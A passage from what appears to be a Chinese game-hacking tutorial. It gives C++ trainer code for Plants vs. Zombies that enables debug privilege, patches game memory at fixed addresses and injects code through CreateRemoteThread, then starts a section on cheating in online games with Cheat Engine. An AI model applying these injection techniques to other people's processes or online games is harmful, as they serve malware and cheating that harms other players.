class=\"line\">\t\tcall edx</span><br><span class=\"line\">\t\tpopad</span><br><span class=\"line\">\t\tret</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton5()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t// 打开目标进程</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t// 在目标进程分配内存空间</span><br><span class=\"line\">\tPVOID ThreadFunAdd = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 往分配的内存空间中写入代码</span><br><span class=\"line\">\tDWORD byWrite = 0;</span><br><span class=\"line\">\tbool bret = WriteProcessMemory(hProcess, ThreadFunAdd, putPlant, 4096, &amp;byWrite);</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 执行目标进程指定地址的代码</span><br><span class=\"line\">\tCreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)ThreadFunAdd, NULL, NULL, NULL);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">bool CplantDlg::enableDebugPriv()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHANDLE hToken;</span><br><span class=\"line\">\tLUID sedebugnameValue;</span><br><span class=\"line\">\tTOKEN_PRIVILEGES tkp;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\treturn false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCloseHandle(hToken);</span><br><span class=\"line\">\t\treturn false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\ttkp.PrivilegeCount = 1;</span><br><span class=\"line\">\ttkp.Privileges[0].Luid = sedebugnameValue;</span><br><span class=\"line\">\ttkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCloseHandle(hToken);</span><br><span class=\"line\">\t\treturn false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::addPlantsToCombox()</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\tint i = 0;</span><br><span class=\"line\">\ti = m_cbPlantsChoose.AddString(_T(&quot;樱桃炸弹&quot;));</span><br><span class=\"line\">\tm_cbPlantsChoose.SetItemData(i, 2);</span><br><span class=\"line\">\ti = m_cbPlantsChoose.AddString(_T(&quot;毁灭菇&quot;));</span><br><span class=\"line\">\tm_cbPlantsChoose.SetItemData(i, 15);</span><br><span class=\"line\">\ti = m_cbPlantsChoose.AddString(_T(&quot;寒冰菇&quot;));</span><br><span class=\"line\">\tm_cbPlantsChoose.SetItemData(i, 14);</span><br><span class=\"line\">\ti = m_cbPlantsChoose.AddString(_T(&quot;魅惑菇&quot;));</span><br><span class=\"line\">\tm_cbPlantsChoose.SetItemData(i, 12);</span><br><span class=\"line\">\ti = m_cbPlantsChoose.AddString(_T(&quot;坚果墙&quot;));</span><br><span class=\"line\">\tm_cbPlantsChoose.SetItemData(i, 3);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct PutPlantsPareame</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tUINT u_x;</span><br><span class=\"line\">\tUINT u_y;</span><br><span class=\"line\">\tUINT u_plantID;</span><br><span class=\"line\">&#125;PutPlantsParame,*PPutPlantsPareame;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">DWORD __stdcall CplantDlg::PutPlants(LPVOID lpThreadParame)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPPutPlantsPareame pParame = (PPutPlantsPareame)lpThreadParame;</span><br><span class=\"line\">\tUINT u_x = pParame-&gt;u_x;</span><br><span class=\"line\">\tUINT u_y = pParame-&gt;u_x;</span><br><span class=\"line\">\tUINT u_plantid = pParame-&gt;u_plantID;</span><br><span class=\"line\"></span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpushad</span><br><span class=\"line\">\t\tpush -1</span><br><span class=\"line\">\t\tpush u_plantid</span><br><span class=\"line\">\t\tmov eax, u_x</span><br><span class=\"line\">\t\tpush u_y</span><br><span class=\"line\">\t\tmov ebx, dword ptr ds:[0x6A9EC0]</span><br><span class=\"line\">\t\tmov ebx, dword ptr ds:[ebx + 0x768]</span><br><span class=\"line\">\t\tpush ebx</span><br><span class=\"line\">\t\tmov edx, 0x0040D120</span><br><span class=\"line\">\t\tcall edx</span><br><span class=\"line\">\t\tpopad</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int CplantDlg::GetPlantsIDByName(CString name)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint i = m_cbPlantsChoose.FindString(-1, name);</span><br><span class=\"line\">\treturn m_cbPlantsChoose.GetItemData(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton5()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tUpdateData(TRUE);   //从页面读取变量</span><br><span class=\"line\">\tCString strPlantName = _T(&quot;&quot;);</span><br><span class=\"line\">\tDWORD dwPlantID = 0;</span><br><span class=\"line\">\tDWORD dwPid = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_cbPlantsChoose.GetWindowText(strPlantName);</span><br><span class=\"line\">\tdwPlantID = GetPlantsIDByName(strPlantName);</span><br><span class=\"line\"></span><br><span class=\"line\">\t//打开进程</span><br><span class=\"line\">\tdwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">\t//远程调用参数</span><br><span class=\"line\">\tPutPlantsPareame parame;</span><br><span class=\"line\">\tparame.u_plantID = dwPlantID;</span><br><span class=\"line\">\tparame.u_x = m_x;</span><br><span class=\"line\">\tparame.u_y = m_y;</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tif (!InjectRemoteFunc(dwPid, PutPlants, &amp;parame, sizeof(parame)))</span><br><span class=\"line\">\t\tMessageBox(_T(&quot;远程调用失败&quot;), NULL, 0);</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL CplantDlg::InjectRemoteFunc(DWORD dwPid, LPVOID mFunc, LPVOID pRemoteParam, DWORD dwParameSize, DWORD dwWaitTime)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHANDLE hProcess = NULL;</span><br><span class=\"line\">\tLPVOID ThreadAdd = NULL;</span><br><span class=\"line\">\tDWORD lpNumberofBytes = 0;</span><br><span class=\"line\">\tBOOL bret = FALSE, bSucc = TRUE;</span><br><span class=\"line\">\tLPVOID ParamAdd = NULL;</span><br><span class=\"line\">\tHANDLE hThread = NULL;</span><br><span class=\"line\">\tDWORD dwWait = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdo</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//打开被注入的进程</span><br><span class=\"line\">\t\thProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\t\tif (NULL == hProcess) break;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t//装载函数的空间</span><br><span class=\"line\">\t\tThreadAdd = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\t\tif (NULL == ThreadAdd) break;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t//写入函数</span><br><span class=\"line\">\t\tbret = WriteProcessMemory(hProcess, ThreadAdd, mFunc, 4096, &amp;lpNumberofBytes);</span><br><span class=\"line\">\t\tif (FALSE == bret) break;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif (0 != dwParameSize)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t//装在函数所需要的参数空间</span><br><span class=\"line\">\t\t\tParamAdd = VirtualAllocEx(hProcess, NULL, dwParameSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">\t\t\tif (NULL == ParamAdd) break;</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t\t//写入参数地址</span><br><span class=\"line\">\t\t\tbret = WriteProcessMemory(hProcess, ParamAdd, pRemoteParam, dwParameSize, &amp;lpNumberofBytes);</span><br><span class=\"line\">\t\t\tif (FALSE == bret) break;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// 创建远程线程</span><br><span class=\"line\">\t\thThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)ThreadAdd, ParamAdd, NULL, &amp;lpNumberofBytes);</span><br><span class=\"line\">\t\tif (NULL == hThread) break;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tbSucc = TRUE;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125; while (FALSE);</span><br><span class=\"line\"></span><br><span class=\"line\">\t//等待线程结束</span><br><span class=\"line\">\tif (bSucc)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tdwWait = WaitForSingleObject(hThread, dwWaitTime);</span><br><span class=\"line\">\t\tif (WAIT_TIMEOUT == dwWait) goto end;   //如果超时放弃释放资源，防止目标进程在使用</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//释放目标线程中分配的资源</span><br><span class=\"line\">\tif (bSucc &amp;&amp; ThreadAdd &amp;&amp; hProcess)</span><br><span class=\"line\">\t\tVirtualFreeEx(hProcess, ThreadAdd, 0, MEM_RELEASE);</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (bSucc &amp;&amp; (0 != dwParameSize) &amp;&amp; pRemoteParam &amp;&amp; hProcess)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tVirtualFreeEx(hProcess, pRemoteParam, 0, MEM_RELEASE);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">end:</span><br><span class=\"line\">\tif (NULL != hThread) CloseHandle(hThread);</span><br><span class=\"line\">\tif (NULL != hProcess) CloseHandle(hProcess);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn bSucc;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//如果使用stdcall,，然后WriteProcessMemory使用单独计算的地址，我的程序会崩溃，只知道是写入多了很多编译器加的代码，但这些代码为什么会出错暂时没找到原因</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton6()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck3()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[4] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (m_noblood)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x83;</span><br><span class=\"line\">\t\tbuf[1] = 0x46;</span><br><span class=\"line\">\t\tbuf[2] = 0x40;</span><br><span class=\"line\">\t\tbuf[3] = 0x01;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x83;</span><br><span class=\"line\">\t\tbuf[1] = 0x46;</span><br><span class=\"line\">\t\tbuf[2] = 0x40;</span><br><span class=\"line\">\t\tbuf[3] = 0xFC;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x0052FCF0), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck4()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[3] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (m_noblood)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x90;</span><br><span class=\"line\">\t\tbuf[1] = 0x90;</span><br><span class=\"line\">\t\tbuf[2] = 0x90;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x0F;</span><br><span class=\"line\">\t\tbuf[1] = 0x95;</span><br><span class=\"line\">\t\tbuf[2] = 0xC0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x0052FCF0), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck5()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[2] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (no_pit)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x90;</span><br><span class=\"line\">\t\tbuf[1] = 0x90;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x75;</span><br><span class=\"line\">\t\tbuf[1] = 0x05;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x0041D79E), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck6()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[2] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (m_nomubei)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x90;</span><br><span class=\"line\">\t\tbuf[1] = 0x90;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x75;</span><br><span class=\"line\">\t\tbuf[1] = 0x5F;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x0045FD07), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD __stdcall CplantDlg::PutAllPlants(LPVOID lpThreadParame)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpushad</span><br><span class=\"line\">\t\tpush -1</span><br><span class=\"line\">\t\tpush 2</span><br><span class=\"line\">\t\tmov eax, 1</span><br><span class=\"line\">\t\tpush 1</span><br><span class=\"line\">\t\tmov ebx, dword ptr ds:[0x6A9EC0]</span><br><span class=\"line\">\t\tmov ebx, dword ptr ds:[ebx + 0x768]</span><br><span class=\"line\">\t\tpush ebx</span><br><span class=\"line\">\t\tmov edx, 0x0040D120</span><br><span class=\"line\">\t\tcall edx</span><br><span class=\"line\">\t\tpopad</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton7()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);   //从页面读取变量</span><br><span class=\"line\">\tCString strPlantName = _T(&quot;&quot;);</span><br><span class=\"line\">\tDWORD dwPlantID = 0;</span><br><span class=\"line\">\tDWORD dwPid = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_cbPlantsChoose.GetWindowText(strPlantName);</span><br><span class=\"line\">\tdwPlantID = GetPlantsIDByName(strPlantName);</span><br><span class=\"line\"></span><br><span class=\"line\">\t//打开进程</span><br><span class=\"line\">\tdwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">\t//远程调用参数</span><br><span class=\"line\">\tPutPlantsPareame parame;</span><br><span class=\"line\">\tparame.u_plantID = dwPlantID;</span><br><span class=\"line\">\tparame.u_x = m_x;</span><br><span class=\"line\">\tparame.u_y = m_y;</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tif (!InjectRemoteFunc(dwPid, PutAllPlants, &amp;parame, sizeof(parame)))</span><br><span class=\"line\">\t\tMessageBox(_T(&quot;远程调用失败&quot;), NULL, 0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck7()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[6] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (m_tudou)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x90;</span><br><span class=\"line\">\t\tbuf[1] = 0x90;</span><br><span class=\"line\">\t\tbuf[2] = 0x90;</span><br><span class=\"line\">\t\tbuf[3] = 0x90;</span><br><span class=\"line\">\t\tbuf[4] = 0x90;</span><br><span class=\"line\">\t\tbuf[5] = 0x90;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x0F;</span><br><span class=\"line\">\t\tbuf[1] = 0x85;</span><br><span class=\"line\">\t\tbuf[2] = 0xFA;</span><br><span class=\"line\">\t\tbuf[3] = 0x01;</span><br><span class=\"line\">\t\tbuf[4] = 0x00;</span><br><span class=\"line\">\t\tbuf[5] = 0x00;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x0045FE53), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck8()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[3] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (m_frozen)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x83;</span><br><span class=\"line\">\t\tbuf[1] = 0xC0;</span><br><span class=\"line\">\t\tbuf[2] = 0x01;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x83;</span><br><span class=\"line\">\t\tbuf[1] = 0xC0;</span><br><span class=\"line\">\t\tbuf[2] = 0xFD;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x0052B41F), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"6网游辅助实战训练\"><a class=\"markdownIt-Anchor\" href=\"#6网游辅助实战训练\">#</a> 6. 网游辅助实战训练</h3>\n<p>LoadLibrary    // 加载模块</p>\n<p>FreeLibrary    // 卸载模块</p>\n<p>CreateRemoteThread    // 创建远程线程</p>\n<p>GetModuleHandle      // 通过模块名称获取模块句柄</p>\n<h4 id=\"角色人物分析\"><a class=\"markdownIt-Anchor\" href=\"#角色人物分析\">#</a> 角色人物分析</h4>\n<p>角色名</p>\n<p>血量</p>\n<p>魔法</p>\n<p>等级</p>\n<p>职业</p>\n<p>找人物的属性信息，其实是找 this 指针，通过偏移来找人物属性</p>\n<p>1. 人物真气</p>\n<p>1.CE 搜索真气值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span 